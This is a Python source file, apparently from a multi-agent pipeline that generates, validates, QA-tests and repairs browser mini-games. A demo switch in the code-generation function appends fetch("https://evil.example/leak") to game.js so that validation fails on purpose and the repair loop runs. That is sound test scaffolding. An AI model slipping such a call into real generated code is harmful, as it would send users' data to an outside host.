    """game_design 之后，用模型真正画出的相机校正 3D archetype（QA 门 / GENRE FIDELITY /
    replan 兜底都依赖它）：first_person ⇒ fps_arena；明确非第一人称却被标成 fps ⇒ 退回 runner_3d。"""
    cam = str(((design or {}).get("scene") or {}).get("camera") or "").lower()
    cur = str(spec.get("archetype") or "")
    if cam == "first_person":
        return "fps_arena"
    if cam in ("third_person", "chase", "orbit") and cur == "fps_arena":
        return "runner_3d"
    return cur if cur in _ARCHETYPES_3D else "fps_arena"


def _difficulty_factor(prompt: str) -> float:
    p = prompt.lower()
    if _has_any(p, ["hard", "difficult", "expert", "困难", "高难", "挑战"]):
        return 1.08
    if _has_any(p, ["easy", "relax", "cozy", "简单", "休闲", "轻松"]):
        return 0.9
    return 1.0


def _balance_plan(archetype: str, spec: dict, prompt: str) -> dict:
    factor = _difficulty_factor(prompt)
    if archetype == "logic_grid":
        return {
            "round_seconds": int(72 / max(0.92, min(1.12, factor))),
            "target_score": 360,
            "lives": 3,
            "player_speed": 260,
            "hazard_speed": 120,
            "hazard_spawn_ms": 1400,
            "collectible_speed": 120,
            "collectible_spawn_ms": 900,
            "max_hazards": 4,
            "lanes": 3,
            "qa": {"min_round_seconds": 45, "requires_solution_path": True},
        }
    if archetype == "lane_runner":
        return {
            "round_seconds": 60,
            "target_score": int(185 * factor),
            "lives": 4,
            "player_speed": 280,
            "hazard_speed": int(135 * factor),
            "hazard_spawn_ms": int(1450 / factor),
            "collectible_speed": int(110 * factor),
            "collectible_spawn_ms": 780,
            "max_hazards": 6,
            "lanes": 3,
            "qa": {"min_reaction_ms": 980, "max_obstacle_density": 7.5},
        }
    return {
        "round_seconds": 65,
        "target_score": int(170 * factor),
        "lives": 4,
        "player_speed": int(330 / max(0.95, min(1.04, factor))),
        "hazard_speed": int(92 * factor),
        "hazard_spawn_ms": int(1750 / factor),
        "collectible_speed": 80,
        "collectible_spawn_ms": 720,
        "max_hazards": 6,
        "lanes": 3,
        "qa": {"min_reaction_ms": 1200, "min_player_to_hazard_ratio": 2.6, "max_obstacle_density": 6.5},
    }


def _merge_balance_into_design(design: dict, archetype: str, balance: dict) -> dict:
    merged = dict(design or {})
    merged["archetype"] = archetype
    rules = dict(merged.get("rules") if isinstance(merged.get("rules"), dict) else {})
    rules["survive_seconds"] = balance.get("round_seconds", rules.get("survive_seconds", 55))
    merged["rules"] = rules
    merged["balance"] = balance
    return merged


def _balance_log_lines(archetype: str, balance: dict) -> list[str]:
    qa = balance.get("qa") if isinstance(balance.get("qa"), dict) else {}
    return [
        f"selected playable archetype: {archetype}",
        f"round target: {balance.get('target_score')} points in {balance.get('round_seconds')}s",
        f"player/hazard: speed={balance.get('player_speed')} / {balance.get('hazard_speed')}, lives={balance.get('lives')}",
        f"spawn budget: hazard every {balance.get('hazard_spawn_ms')}ms, collectible every {balance.get('collectible_spawn_ms')}ms, max hazards={balance.get('max_hazards')}",
        "QA thresholds: " + (", ".join(f"{key}={value}" for key, value in qa.items()) or "default"),
    ]


def _gameplay_qa(state: dict) -> dict:
    """Model-first smoke QA: prove the artifact is a real, runnable game without
    second-guessing how the model wrote it. Hard-fail only on "this isn't a game";
    quality gaps become warnings that never degrade the bundle to a template."""
    spec = state.get("game_spec") or {}
    design = state.get("game_design") or {}
    archetype = spec.get("archetype") or design.get("archetype") or ("webgl_3d" if state.get("dimension") == "3d" else "canvas_arcade")
    validation_result = state.get("validation_result") or {}
    files = state.get("generated_files") or []
    js = next((f.get("content", "") for f in files if f.get("path") == "game.js"), "")
    html = next((f.get("content", "") for f in files if f.get("path") == "index.html"), "")
    low = (js + "\n" + html).lower()

    issues: list[str] = []
    warnings: list[str] = []

    if not validation_result.get("valid"):
        issues.append("static validation must pass before gameplay QA")
    if len(js) < 400:
        issues.append("game.js is too small to be a real game")
    if "requestanimationframe" not in low and "setinterval" not in low:
        issues.append("no game loop (requestAnimationFrame/setInterval) found")
    has_input = any(tok in low for tok in [
        "addeventlistener", "onkeydown", "onkeyup", "onmousemove", "onpointer", "ontouch", "onclick",
    ])
    if not has_input:
        issues.append("no input handling found")
    has_restart = any(tok in low for tok in [
        "restart", "reset(", "replay", "again", "location.reload", '"rs"', "'rs'",
    ])
    if not has_restart:
        warnings.append("no obvious restart affordance detected")

    # 运行时冒烟：在沙箱里把 game.js 顶层跑一遍，"一加载就崩"判硬失败 → 触发 repair/replan。
    smoke_ok, smoke_detail = smoke.run_smoke(js)
    if not smoke_ok:
        issues.append(f"runtime smoke test: game crashed on load — {smoke_detail}")

    is_3d = state.get("dimension") == "3d"
    if is_3d:
        depth_metric = any(tok in low for tok in ["three.", "webglrenderer", "perspectivecamera", "scene()", "new scene"])
        if not depth_metric:
            warnings.append("3D may be missing: no Three.js/WebGL usage detected")
        if "three.min.js" not in low:
            warnings.append("index.html does not reference the self-hosted three.min.js")
        if archetype == "fps_arena" and not _has_any(low, ["raycaster", "pointerlock", "requestpointerlock"]):
            warnings.append("fps_arena has no raycaster / pointer-lock logic")
    else:
        depth_metric = any(tok in low for tok in ["shadowblur", "createlineargradient", "createradialgradient"])
        if not depth_metric:
            warnings.append("art may look flat: no gradient/glow detected")
        if archetype == "vertical_shooter":
            if not _has_any(low, ["bullet", "shoot", "fire", "projectile", "laser"]):
                warnings.append("shooter has no obvious projectile logic")
            if "boss" not in low:
                warnings.append("shooter has no boss climax")

    return {
        "passed": not issues,
        "archetype": archetype,
        "issues": issues,
        "warnings": warnings,
        "metrics": {
            "js_bytes": len(js.encode("utf-8")),
            "has_input": has_input,
            "has_restart": has_restart,
            "runtime_smoke_ok": smoke_ok,
            ("uses_three_webgl" if is_3d else "uses_gradient_or_glow"): depth_metric,
        },
    }


def _gameplay_qa_log_lines(result: dict) -> list[str]:
    m = result.get("metrics") or {}
    depth_label = "three/webgl" if "uses_three_webgl" in m else "gradient/glow"
    depth_val = m.get("uses_three_webgl", m.get("uses_gradient_or_glow"))
    lines = [
        f"playtest archetype: {result.get('archetype')}",
        f"code smoke: game.js={m.get('js_bytes')} bytes, input={m.get('has_input')}, restart={m.get('has_restart')}, {depth_label}={depth_val}",
    ]
    if m.get("runtime_smoke_ok") is not None:
        lines.append("runtime smoke: " + ("passed (top-level executes clean)" if m.get("runtime_smoke_ok") else "CRASHED on load"))
    if result.get("warnings"):
        lines.append("quality warnings: " + "; ".join(result["warnings"][:4]))
    if result.get("issues"):
        return lines + ["gameplay QA failed:"] + result["issues"][:6]
    return lines + ["gameplay QA passed: runnable game loop with input and restart"]


def _repair_balance(balance: dict, archetype: str, attempt: int) -> dict:
    repaired = dict(balance or {})
    repaired["round_seconds"] = min(90, int((repaired.get("round_seconds") or 55) + 8))
    repaired["target_score"] = max(40, int((repaired.get("target_score") or 180) * 0.86))
    repaired["lives"] = min(5, int(repaired.get("lives") or 3) + 1)
    if archetype == "logic_grid":
        repaired["round_seconds"] = min(90, int((repaired.get("round_seconds") or 70) + 12))
    else:
        repaired["player_speed"] = int((repaired.get("player_speed") or 280) * 1.08)
        repaired["hazard_speed"] = int((repaired.get("hazard_speed") or 140) * 0.78)
        repaired["hazard_spawn_ms"] = min(2600, int((repaired.get("hazard_spawn_ms") or 1200) * 1.35))
        repaired["max_hazards"] = max(4, int(repaired.get("max_hazards") or 8) - 2)
    repaired["repair_attempt"] = attempt
    return repaired


def _generate_code(state: dict, repair_error: str | None = None) -> tuple[list[dict], int, str]:
    spec = state.get("game_spec") or {}
    design = state.get("game_design") or {}
    title = str(spec.get("title") or "PlayForge Game")

    # 3D：无模板兜底，完全由模型产出。失败/过短 → 返回不合规 bundle，交给 repair/replan。
    if state.get("dimension") == "3d":
        files: list[dict] = []
        tokens = 0
        if not state.get("use_real"):
            mode = "3D needs real model (offline mock cannot author 3D)"
        else:
            try:
                raw, tokens = llm.chat(
                    prompts.CODE_SYSTEM_PROMPT_3D,
                    prompts.build_code_prompt(spec, design, _reference_for(spec), repair_error, dimension="3d"),
                )
                bundle = _extract_bundle(raw)
                js = bundle.get("game.js", "")
                files = _assemble_bundle(bundle, title, dimension="3d")
                if js and len(js) > 400:
                    mode = "model (full 3D bundle)" if bundle.get("index.html") else "model (3D game.js)"
                else:
                    mode = "model 3D output too short -> QA/repair"
            except Exception as exc:  # noqa: BLE001
                files = []
                mode = f"model 3D failed: {_clip(exc, 120)}"
        if _should_inject(state):
            for file in files:
                if file["path"] == "game.js":
                    file["content"] += '\nfetch("https://evil.example/leak");  // [demo] forbidden API'
        return files, tokens, mode

    # ---- 2D：确定性模板基线 + 模型优先覆盖（原逻辑）----
    tname = templating.select_template(spec, design)
    cfg = templating.build_config(spec, design, state.get("asset_manifest") or {}, state.get("balance_config"))
    files = templating.render_files(tname, cfg)
    tokens = 0
    mode = "template"

    if state.get("use_real") and not state.get("use_template_code"):
        try:
            raw, tokens = llm.chat(
                prompts.CODE_SYSTEM_PROMPT,
                prompts.build_code_prompt(spec, design, _reference_for(spec), repair_error),
            )
            bundle = _extract_bundle(raw)
            js = bundle.get("game.js", "")
            if js and len(js) > 400:
                files = _assemble_bundle(bundle, cfg.get("title") or "PlayForge Game")
                mode = "model (full bundle)" if bundle.get("index.html") else "model (game.js)"
            else:
                mode = "template (model output too short)"
        except Exception as exc:  # noqa: BLE001
            mode = f"template (model failed: {_clip(exc, 120)})"

    if _should_inject(state):
        for file in files:
            if file["path"] == "game.js":
                file["content"] += '\nfetch("https://evil.example/leak");  // [demo] forbidden API'
    return files, tokens, mode


def _revision_file_map(files: list[dict] | None) -> dict[str, str]:
    return {
        str(file.get("path")): str(file.get("content") or "")
        for file in (files or [])
        if file.get("path") in {"index.html", "style.css", "game.js"}
    }


def _generate_revision_code(
    state: dict, repair_error: str | None = None
) -> tuple[list[dict], int, list[str], str]:
    source_files = (
        state.get("generated_files")
        if repair_error and state.get("generated_files")
        else state.get("existing_files")
    ) or []
    source = _revision_file_map(source_files)
    if not state.get("use_real"):
        files = [{"path": path, "content": source[path]} for path in ("index.html", "style.css", "game.js") if path in source]
        return files, 0, [], "real model required for semantic revision"

    raw, tokens = llm.chat(
        prompts.CODE_REVISION_SYSTEM_PROMPT,
        prompts.build_code_revision_prompt(
            state.get("source_feedback") or state.get("prompt") or "",
            state.get("feedback_brief") or "",
            state.get("game_spec") or {},
            state.get("game_design") or {},
            source_files,
            repair_error,
            state.get("memory_context") or "",
        ),
    )
    returned = _extract_bundle(raw)
    merged = dict(source)
    changed: list[str] = []
    for path in ("index.html", "style.css", "game.js"):
        content = returned.get(path)
        if content is None or content == source.get(path):
            continue
        merged[path] = content
        changed.append(path)
    files = [{"path": path, "content": merged[path]} for path in ("index.html", "style.css", "game.js") if path in merged]
    return files, tokens, changed, "model incremental revision"


def safety_intake_node(state: dict) -> dict:
    prompt = state.get("prompt", "") or ""
    if not prompt.strip():
        return {
            "status": "failed",
            "error_code": "EMPTY_PROMPT",
            "error_message": "Prompt cannot be empty",
            "_agent": "SafetyIntakeAgent",
            "_logs": ["prompt is empty -> rejected"],
        }
    if len(prompt) > 2000:
        return {
            "status": "failed",
            "error_code": "PROMPT_TOO_LONG",
            "error_message": "Prompt too long (>2000 chars)",
            "_agent": "SafetyIntakeAgent",
            "_logs": ["prompt exceeds 2000 chars -> rejected"],
        }
    for pattern in _BLOCKED:
        if re.search(pattern, prompt, re.IGNORECASE):
            return {
                "status": "failed",
                "error_code": "SAFETY_REJECTED",
                "error_message": "Prompt rejected by safety rule",
                "_agent": "SafetyIntakeAgent",
                "_logs": [f"blocked pattern matched ({pattern}) -> rejected"],
            }
    cues = _prompt_cues(prompt)
    return {
        "normalized_prompt": prompt.strip(),
        "safety_result": {"passed": True, "risk_level": "low"},
        "_agent": "SafetyIntakeAgent",
        "_logs": [
            f"prompt accepted: {len(prompt)} chars, {len(prompt.split())} word(s)",
            "intent cues: " + (", ".join(cues) if cues else "none detected"),
            f"uploaded asset ids received: {len(state.get('asset_ids') or [])}",
            f"policy scan passed: {len(_BLOCKED)} blocked-pattern checks",
            f"normalized prompt: {_clip(prompt, 160)}",
        ],
    }


def memory_retrieval_node(state: dict) -> dict:
    from app.db.session import SessionLocal
    from app.services import memory as memory_service

    user_id = state.get("user_id")
    query = state.get("source_feedback") or state.get("normalized_prompt") or state.get("prompt") or ""
    game_id = state.get("base_game_id") if state.get("task_kind") == "revision" else None
    if not user_id:
        return {
            "retrieved_memories": [],
            "memory_context": "",
            "_agent": "MemoryRetrievalAgent",
            "_logs": ["memory skipped: missing user id"],
        }
    categories = (
        ["feedback", "controls", "difficulty", "constraints", "style", "mechanics"]
        if state.get("task_kind") == "revision"
        else ["style", "mechanics", "controls", "difficulty", "constraints", "content"]
    )
    db = SessionLocal()
    try:
        items = memory_service.retrieve_memories(
            db,
            user_id=user_id,
            query=query,
            game_id=game_id,
            categories=categories,
            limit=8,
        )
        context = memory_service.render_memory_context(items)
        # Persist lazily generated vectors for memories created before the
        # embedding migration. Retrieval remains fail-open if this commit fails.
        db.commit()
    except Exception as exc:  # noqa: BLE001
        items, context = [], ""
        return {
            "retrieved_memories": items,
            "memory_context": context,
            "_agent": "MemoryRetrievalAgent",
            "_logs": [f"memory retrieval failed open: {_clip(exc, 160)}"],
        }
    finally:
        db.close()
    scope = f"game={game_id}" if game_id else "user"
    strategy = (items[0].get("retrieval") or {}).get("strategy") if items else "none"
    return {
        "retrieved_memories": items,
        "memory_context": context,
        "_agent": "MemoryRetrievalAgent",
        "_logs": [
            f"scope: {scope}",
            f"query: {_clip(query, 140)}",
            f"retrieved memories: {len(items)}",
            f"retrieval strategy: {strategy}",
        ]
        + [
            f"- {item.get('scope_type')}/{item.get('category')}: {_clip(item.get('raw_text'), 120)}"
            for item in items[:5]
        ],
    }


def intent_spec_node(state: dict) -> dict:
    prompt = state.get("normalized_prompt") or state.get("prompt", "")
    if state.get("use_real"):
        try:
            raw, tokens = llm.chat(
                prompts.INTENT_SPEC_SYSTEM_PROMPT,
                prompts.build_intent_spec_prompt(
                    prompt,
                    len(state.get("asset_ids") or []),
                    state.get("memory_context") or "",
                ),
            )
            spec = _coerce_spec(_parse_json(raw), prompt)
            return {"game_spec": spec, "_agent": "IntentSpecAgent", "_tokens_delta": tokens, "_logs": _spec_log_lines(spec, "model GameSpec JSON")}
        except Exception as exc:  # noqa: BLE001
            spec = _heuristic_spec(prompt)
            return {"game_spec": spec, "_agent": "IntentSpecAgent", "_logs": [f"model failed: {_clip(exc, 120)}"] + _spec_log_lines(spec, "heuristic fallback")}
    spec = _heuristic_spec(prompt)
    return {"game_spec": spec, "_agent": "IntentSpecAgent", "_logs": _spec_log_lines(spec, "offline heuristic")}


def brief_expansion_node(state: dict) -> dict:
    prompt = state.get("normalized_prompt") or state.get("prompt", "")
    spec = state.get("game_spec") or {}
    if state.get("use_real"):
        try:
            raw, tokens = llm.chat(
                "Expand a short game prompt into compact JSON for a playable browser mini-game. Do not add unsafe APIs.",
                (
                    "Return JSON with keys player_fantasy, objective, core_verbs, mechanic_requirements, "
                    "reward_loop, difficulty_beats, feedback, keywords, minimum_content. "
                    f"Prompt: {prompt}\nSpec: {json.dumps(spec, ensure_ascii=False)}"
                ),
            )
            brief = _coerce_brief(_parse_json(raw), prompt, spec)
            return {"expanded_brief": brief, "_agent": "BriefExpansionAgent", "_tokens_delta": tokens, "_logs": _brief_log_lines(brief, "model brief expansion")}
        except Exception as exc:  # noqa: BLE001
            brief = _heuristic_brief(prompt, spec)
            return {"expanded_brief": brief, "_agent": "BriefExpansionAgent", "_logs": [f"model failed: {_clip(exc, 120)}"] + _brief_log_lines(brief, "heuristic fallback")}
    brief = _heuristic_brief(prompt, spec)
    return {"expanded_brief": brief, "_agent": "BriefExpansionAgent", "_logs": _brief_log_lines(brief, "offline heuristic")}


def mechanic_planner_node(state: dict) -> dict:
    prompt = state.get("normalized_prompt") or state.get("prompt", "")
    spec = state.get("game_spec") or {}
    brief = state.get("expanded_brief") or _heuristic_brief(prompt, spec)
    if state.get("use_real"):
        try:
            raw, tokens = llm.chat(
                "Plan concrete mini-game mechanics as bounded JSON. Prefer proven mechanics over novelty.",
                (
                    "Return JSON with keys archetype_hint, primary_action, secondary_action, risk_model, reward_model, "
                    "enemy_behaviors, reward_items, powerups, feedback, skill_tests. "
                    f"Spec: {json.dumps(spec, ensure_ascii=False)}\nBrief: {json.dumps(brief, ensure_ascii=False)}"
                ),
            )
            plan = _coerce_mechanic_plan(_parse_json(raw), spec, brief, prompt)
            return {"mechanic_plan": plan, "_agent": "MechanicPlannerAgent", "_tokens_delta": tokens, "_logs": _mechanic_log_lines(plan, "model mechanic plan")}
        except Exception as exc:  # noqa: BLE001
            plan = _heuristic_mechanic_plan(spec, brief, prompt)
            return {"mechanic_plan": plan, "_agent": "MechanicPlannerAgent", "_logs": [f"model failed: {_clip(exc, 120)}"] + _mechanic_log_lines(plan, "heuristic fallback")}
    plan = _heuristic_mechanic_plan(spec, brief, prompt)
    return {"mechanic_plan": plan, "_agent": "MechanicPlannerAgent", "_logs": _mechanic_log_lines(plan, "offline heuristic")}


def archetype_router_node(state: dict) -> dict:
    prompt = state.get("normalized_prompt") or state.get("prompt", "")
    spec = dict(state.get("game_spec") or {})
    is_3d = state.get("dimension") == "3d"
    if is_3d:
        spec["dimension"] = "3d"
        spec["target_runtime"] = "webgl"
        result = _route_archetype_3d(spec, prompt, state.get("expanded_brief"), state.get("mechanic_plan"))
    else:
        spec["dimension"] = "2d"
        result = _route_archetype(spec, prompt, state.get("expanded_brief"), state.get("mechanic_plan"))
    spec["archetype"] = result["archetype"]
    spec["genre"] = result["genre"]
    spec["core_loop"] = result["core_loop"]
    tags = [str(tag) for tag in (spec.get("tags") or [])]
    for tag in [result["genre"], result["archetype"].replace("_", "-")]:
        if tag not in tags:
            tags.append(tag)
    spec["tags"] = tags[:5]
    return {
        "game_spec": spec,
        "archetype_result": result,
        "_agent": "ArchetypeRouterAgent",
        "_logs": [
            f"archetype selected: {result['archetype']} ({result['label']})",
            f"routing reason: {result['reason']}",
            f"core loop locked: {result['core_loop']}",
            (
                "runtime: 3D WebGL (Three.js, self-hosted) — model-authored, no template fallback"
                if is_3d
                else "template family: deterministic canvas, no network, no storage"
            ),
        ],
    }


def asset_processing_node(state: dict) -> dict:
    from app.db.session import SessionLocal
    from app.models import Asset

    ids = state.get("asset_ids") or []
    uploaded = []
    if ids:
        db = SessionLocal()
        try:
            for asset in db.query(Asset).filter(Asset.id.in_(ids)).all():
                uploaded.append({"id": asset.id, "key": asset.filename, "type": asset.kind, "url": s3.public_url(asset.oss_key), "source": "uploaded"})
        finally:
            db.close()
    spec = state.get("game_spec") or {}
    asset_manifest = {"cover": _theme_cover(spec.get("theme")), "assets": uploaded}
    return {"uploaded_assets": uploaded, "asset_manifest": asset_manifest, "_agent": "AssetAgent", "_logs": _asset_log_lines(uploaded, asset_manifest, spec)}


def game_design_node(state: dict) -> dict:
    spec = state.get("game_spec") or {}
    is_3d = state.get("dimension") == "3d"
    if state.get("use_real"):
        try:
            sys_prompt = prompts.GAME_DESIGN_SYSTEM_PROMPT_3D if is_3d else prompts.GAME_DESIGN_SYSTEM_PROMPT
            raw, tokens = llm.chat(sys_prompt, prompts.build_game_design_prompt(
                spec,
                state.get("asset_manifest"),
                expanded_brief=state.get("expanded_brief"),
                mechanic_plan=state.get("mechanic_plan"),
                player_idea=state.get("normalized_prompt") or state.get("prompt"),
                memory_context=state.get("memory_context") or "",
            ))
            design = _coerce_design(_parse_json(raw), spec)
            fed = [k for k, v in (("brief", state.get("expanded_brief")), ("mechanic_plan", state.get("mechanic_plan")), ("player_idea", state.get("normalized_prompt"))) if v]
            out = {"game_design": design, "_agent": "GameDesignAgent", "_tokens_delta": tokens,
                   "_logs": [f"source: model GameDesign JSON ({'3D' if is_3d else '2D'})",
                             "design context fed: " + (", ".join(fed) or "spec only")] + _design_log_lines(design)}
            if is_3d:
                new_arch = _reconcile_archetype_3d(spec, design)
                if new_arch != spec.get("archetype"):
                    meta = _ARCHETYPES_3D[new_arch]
                    out["game_spec"] = {**spec, "archetype": new_arch, "genre": meta["genre"], "core_loop": meta["loop"]}
                    out["_logs"].append(f"3D archetype reconciled from design camera -> {new_arch}")
            return out
        except Exception as exc:  # noqa: BLE001
            design = _heuristic_design(spec)
            return {"game_design": design, "_agent": "GameDesignAgent", "_logs": [f"model failed: {_clip(exc, 120)}", "source: heuristic fallback"] + _design_log_lines(design)}
    design = _heuristic_design(spec)
    return {"game_design": design, "_agent": "GameDesignAgent", "_logs": ["source: offline heuristic"] + _design_log_lines(design)}


def content_plan_node(state: dict) -> dict:
    spec = state.get("game_spec") or {}
    brief = state.get("expanded_brief") or _heuristic_brief(state.get("normalized_prompt") or state.get("prompt", ""), spec)
    mechanics = state.get("mechanic_plan") or _heuristic_mechanic_plan(spec, brief, state.get("normalized_prompt") or state.get("prompt", ""))
    archetype = spec.get("archetype") or (state.get("archetype_result") or {}).get("archetype") or mechanics.get("archetype_hint") or "topdown_collect"
    plan = _content_plan(archetype, spec, brief, mechanics)
    design = dict(state.get("game_design") or _heuristic_design(spec))
    design["mechanic_plan"] = mechanics
    design["content_plan"] = plan
    return {
        "game_design": design,
        "content_plan": plan,
        "_agent": "ContentPlanAgent",
        "_logs": _content_log_lines(plan),
    }


def balance_plan_node(state: dict) -> dict:
    prompt = state.get("normalized_prompt") or state.get("prompt", "")
    spec = dict(state.get("game_spec") or {})
    archetype = spec.get("archetype") or (state.get("archetype_result") or {}).get("archetype") or "topdown_collect"
    balance = _balance_plan(archetype, spec, prompt)
    design = _merge_balance_into_design(state.get("game_design") or _heuristic_design(spec), archetype, balance)
    if state.get("mechanic_plan"):
        design["mechanic_plan"] = state["mechanic_plan"]
    if state.get("content_plan"):
        design["content_plan"] = state["content_plan"]
    return {
        "game_spec": spec,
        "game_design": design,
        "balance_config": balance,
        "_agent": "BalanceAgent",
        "_logs": _balance_log_lines(archetype, balance),
    }


def feedback_understanding_node(state: dict) -> dict:
    feedback = state.get("source_feedback") or state.get("prompt") or ""
    tokens = 0
    if state.get("use_real"):
        try:
            brief, tokens = llm.chat(
                prompts.FEEDBACK_UNDERSTANDING_SYSTEM_PROMPT,
                prompts.build_feedback_understanding_prompt(
                    feedback,
                    state.get("game_spec") or {},
                    state.get("game_design") or {},
                    state.get("memory_context") or "",
                ),
            )
        except Exception as exc:  # noqa: BLE001
            brief = f"Change goal\n{feedback}\n\nPreserve\nAll behavior not mentioned by the player.\n\nUncertainties\nModel interpretation failed: {_clip(exc, 120)}"
    else:
        brief = f"Change goal\n{feedback}\n\nPreserve\nAll behavior not mentioned by the player.\n\nUncertainties\nNone inferred in offline mode."
    return {
        "feedback_brief": brief,
        "_agent": "FeedbackUnderstandingAgent",
        "_tokens_delta": tokens,
        "_logs": [
            f"preserved raw feedback: {_clip(feedback, 180)}",
            f"natural-language change brief: {_clip(brief, 240)}",
        ],
    }


def code_revision_node(state: dict) -> dict:
    try:
        files, tokens, changed, mode = _generate_revision_code(state)
    except Exception as exc:  # noqa: BLE001
        files, tokens, changed, mode = state.get("existing_files") or [], 0, [], f"revision failed: {_clip(exc, 160)}"
    return {
        "generated_files": files,
        "revision_result": {"changed_files": changed, "base_version": state.get("base_version")},
        "_agent": "CodeRevisionAgent",
        "_tokens_delta": tokens,
        "_logs": [
            f"base version: {state.get('base_version')}",
            f"revision mode: {mode}",
            "changed files: " + (", ".join(changed) if changed else "none"),
        ] + _file_log_lines(files),
    }


def code_generation_node(state: dict) -> dict:
    files, tokens, mode = _generate_code(state)
    spec = state.get("game_spec") or {}
    design = state.get("game_design") or {}
    if state.get("dimension") == "3d":
        scene = design.get("scene") if isinstance(design.get("scene"), dict) else {}
        logs = [
            "render mode: 3D WebGL via self-hosted Three.js (relative three.min.js, global THREE)",
            f"archetype: {spec.get('archetype')} ({(state.get('archetype_result') or {}).get('label', '3D')})",
            f"camera/scene: {scene.get('camera', 'n/a')} · {_clip(scene.get('environment'), 80)}",
            "few-shot reference: " + _REFERENCE_BY_ARCHETYPE_3D.get(str(spec.get("archetype") or ""), "three_fps"),
            f"game.js source: {mode}",
        ] + _file_log_lines(files)
    else:
        cfg = templating.build_config(spec, design, state.get("asset_manifest") or {}, state.get("balance_config"))
        tname = templating.select_template(spec, design)
        logs = [
            f"selected template: {tname}",
            f"runtime config: archetype={cfg.get('archetype')}, duration={cfg.get('duration')}s, target={cfg.get('target_score')}, lives={cfg.get('lives')}",
            f"difficulty config: hazard_speed={cfg.get('hazard_speed')}, hazard_spawn={cfg.get('hazard_spawn_ms')}ms, max_hazards={cfg.get('max_hazards')}",
            f"mechanic content: {cfg.get('mechanic_label')} with {cfg.get('wave_count')} wave(s)",
            f"control hint: {_clip(cfg.get('hint'), 90)}",
            f"game.js source: {mode}",
        ] + _file_log_lines(files)
    if _should_inject(state):
        logs.append("[demo] injected forbidden API to trigger repair loop")
    return {"generated_files": files, "_agent": "GameCodeAgent", "_tokens_delta": tokens, "_logs": logs}


def build_validation_node(state: dict) -> dict:
    result = validation.validate_files(state.get("generated_files") or [])
    if state.get("task_kind") == "revision" and not (state.get("revision_result") or {}).get("changed_files"):
        result = dict(result)
        result["valid"] = False
        result["errors"] = list(result.get("errors") or []) + ["revision produced no file changes"]
    if result["valid"]:
        return {"validation_result": result, "_agent": "BuildValidateAgent", "_logs": _validation_log_lines(result) + ["validation passed"]}
    return {
        "validation_result": result,
        "last_error": "; ".join(result["errors"]),
        "_agent": "BuildValidateAgent",
        "_logs": _validation_log_lines(result) + ["validation failed:"] + result["errors"][:6],
    }


def gameplay_qa_node(state: dict) -> dict:
    result = _gameplay_qa(state)
    failed = not result.get("passed")
    output = {
        "gameplay_qa_result": result,
        "_agent": "GameplayQAAgent",
        "_logs": _gameplay_qa_log_lines(result),
    }
    if failed:
        output["last_error"] = "; ".join(result.get("issues") or ["gameplay QA failed"])
        output["_step_failed"] = True
    return output


def repair_code_node(state: dict) -> dict:
    attempts = state.get("repair_attempts", 0) + 1
    files, tokens, mode = _generate_code({**state, "repair_attempts": attempts}, repair_error=state.get("last_error"))
    return {
        "generated_files": files,
        "repair_attempts": attempts,
        "_agent": "GameCodeAgentRepair",
        "_tokens_delta": tokens,
        "_logs": [
            f"repair attempt: {attempts}/{MAX_REPAIR}",
            f"previous validation error: {_clip(state.get('last_error'), 180)}",
            f"regenerated game.js using {mode}",
        ]
        + _file_log_lines(files)
        + ["queued validation retry"],
    }


def revision_repair_node(state: dict) -> dict:
    attempts = state.get("repair_attempts", 0) + 1
    try:
        files, tokens, changed, mode = _generate_revision_code(state, repair_error=state.get("last_error"))
    except Exception as exc:  # noqa: BLE001
        files, tokens, changed, mode = state.get("generated_files") or state.get("existing_files") or [], 0, [], f"revision repair failed: {_clip(exc, 160)}"
    return {
        "generated_files": files,
        "revision_result": {"changed_files": changed, "base_version": state.get("base_version")},
        "validation_result": {},
        "gameplay_qa_result": {},
        "repair_attempts": attempts,
        "_agent": "CodeRevisionRepairAgent",
        "_tokens_delta": tokens,
        "_logs": [
            f"revision repair attempt: {attempts}/{MAX_REPAIR}",
            f"previous error: {_clip(state.get('last_error'), 180)}",
            f"revision mode: {mode}",
            "changed files: " + (", ".join(changed) if changed else "none"),
            "queued validation retry",
        ],
    }


def gameplay_repair_node(state: dict) -> dict:
    attempts = state.get("gameplay_repair_attempts", 0) + 1
    spec = state.get("game_spec") or {}
    archetype = spec.get("archetype") or (state.get("game_design") or {}).get("archetype") or "topdown_collect"
    balance = _repair_balance(state.get("balance_config") or (state.get("game_design") or {}).get("balance") or {}, archetype, attempts)
    design = _merge_balance_into_design(state.get("game_design") or _heuristic_design(spec), archetype, balance)
    issues = (state.get("gameplay_qa_result") or {}).get("issues") or []
    return {
        "balance_config": balance,
        "game_design": design,
        "generated_files": [],
        "validation_result": {},
        "gameplay_qa_result": {},
        "gameplay_repair_attempts": attempts,
        "last_error": None,
        "_agent": "GameplayRepairAgent",
        "_logs": [
            f"gameplay repair attempt: {attempts}/{MAX_GAMEPLAY_REPAIR}",
            "QA issues: " + ("; ".join(issues[:3]) if issues else "balance threshold miss"),
            "applied safer balance: slower hazards, wider spawn interval, lower target, extra life",
        ]
        + _balance_log_lines(archetype, balance)
        + ["queued code regeneration"],
    }


def replan_game_design_node(state: dict) -> dict:
    attempts = state.get("replan_attempts", 0) + 1
    is_3d = state.get("dimension") == "3d"
    extra = {}
    if state.get("use_real"):
        try:
            sys_prompt = prompts.REPLAN_SYSTEM_PROMPT_3D if is_3d else prompts.REPLAN_SYSTEM_PROMPT
            raw, tokens = llm.chat(sys_prompt, prompts.build_replan_prompt(state.get("game_spec"), state.get("game_design"), state.get("last_error")))
            design = _coerce_design(_parse_json(raw), state.get("game_spec"))
            extra = {"_tokens_delta": tokens}
        except Exception:
            design = _simplify_design_3d(state.get("game_design")) if is_3d else _simplify_design(state.get("game_design"))
    else:
        design = _simplify_design_3d(state.get("game_design")) if is_3d else _simplify_design(state.get("game_design"))
    out = {
        "game_design": design,
        "generated_files": [],
        "validation_result": {},
        "gameplay_qa_result": {},
        "repair_attempts": 0,
        "gameplay_repair_attempts": 0,
        "replan_attempts": attempts,
        "last_error": None,
        "_agent": "GameDesignAgentReplan",
        "_logs": [
            f"replan attempt: {attempts}/{MAX_REPLAN}",
            f"reason: {_clip(state.get('last_error'), 180)}",
            (
                "simplified the 3D scope; kept model-authored 3D (no 2D fallback)"
                if is_3d
                else "simplified playable scope and switched to stable template code"
            ),
        ]
        + _design_log_lines(design)
        + ["reset repair counters; queued balance planning"],
        **extra,
    }
    if not is_3d:
        out["use_template_code"] = True  # 仅 2D 回退稳定模板；3D 保持模型优先
    return out


def publish_artifact_node(state: dict) -> dict:
    from app.services import packaging

    game_id, version_id, manifest_url = packaging.publish_generated(state)
    return {
